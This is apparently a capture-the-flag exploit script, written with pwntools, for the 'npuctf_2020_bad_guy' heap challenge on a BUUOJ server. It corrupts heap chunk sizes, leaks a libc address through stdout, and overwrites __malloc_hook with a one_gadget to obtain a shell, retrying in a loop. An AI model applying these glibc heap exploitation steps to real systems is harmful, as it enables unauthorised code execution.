#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/23 11:39:38
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = "amd64"
context.os ='linux'
if debug:
    if context.arch == "amd64":
        sh = process(["./npuctf_2020_bad_guy"],env={'LD_PRELOAD':'../../libc_file/16-64-libc-2.23.so'})
        sh = process('./npuctf_2020_bad_guy')
        # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #libc = ELF("../../libc_file/16-64-libc-2.23.so")
        one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
    else:
        # sh = process(["./npuctf_2020_bad_guy"],env={'LD_PRELOAD':'../../libc_file/16-32-libc-2.23.so'})
        #sh = process("./")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc = ELF("../../libc_file/16-32-libc-2.23.so")
else:
    IP = 'node4.buuoj.cn'
    port = 26950
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
def debug():
    gdb.attach(sh)
    pause()

elf = ELF('./npuctf_2020_bad_guy')
def cmd(choice):
    sh.recvuntil(">> ")
    sh.sendline(str(choice))

def add(idx,size,content):
    cmd(1)
    sh.recvuntil("Index :")
    sh.sendline(str(idx))
    sh.recvuntil("size: ")
    sh.sendline(str(size))
    sh.recvuntil("Content:")
    sh.send(content)

def edit(idx,size,content):
    cmd(2)
    sh.recvuntil("Index :")
    sh.sendline(str(idx))
    sh.recvuntil("size: ")
    sh.sendline(str(size))
    sh.recvuntil("content: ")
    sh.send(content)

def dele(idx):
    cmd(3)
    sh.recvuntil("Index :")
    sh.sendline(str(idx))
def pwn():
    add(0,0x10,'aaaa') 
    add(1,0x10,"aaaa")
    add(2,0x60,'aaaa')
    add(3,0x60,'aaaa')
    add(9,0x10,'aaaa')
    add(4,0x60,"aaaa")

    #str_out =  "\xdd\x85"
    payload = 'a' * 0x10 + p64(0) + p64(0x91) 
    edit(0,len(payload),payload)
    dele(1)
    add(1,0x10,'aaaa')
    payload = 'a' * 0x10 + p64(0) + p64(0x71) + "\xdd\x85"
    edit(1,len(payload),payload)
    dele(3)
    dele(4)
    payload = 'a' * 0x10 + p64(0) + p64(0x71) + p8(0x40)
    edit(9,len(payload),payload)
    add(3,0x60,'aaaa')
    add(4,0x60,'aaaa')
    payload = "\x00" * 0x33 + p64(0xfbad1887) + p64(0) * 3 + p8(0x80)
    add(5,0x60,payload)
    leak_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    libc_base = leak_addr - libc.symbols['_IO_2_1_stdin_']
    one_gadget = libc_base + one_offset[3]
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    log.info("libc_base=>{}".format(hex(libc_base)))
    log.info("malloc_hook=>{}".format(hex(malloc_hook)))
    log.info("one_gadget=>{}".format(hex(one_gadget)))
    dele(3)
    dele(4)
    payload = 'a' * 0x10 + p64(0) + p64(0x71) + p64(malloc_hook-0x23)
    edit(1,len(payload),payload)
    add(3,0x60,'aaaa')
    add(4,0x60,"\x00"*0x13 + p64(one_gadget))
    cmd(1)
    sh.sendline("1")
    # pause()
    sh.interactive()
times = 1
while True:
    log.info("times=>{}".format(hex(times)))
    times = times + 1 
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    try:
        pwn()
        break
    except:
        sh.close()
        continue
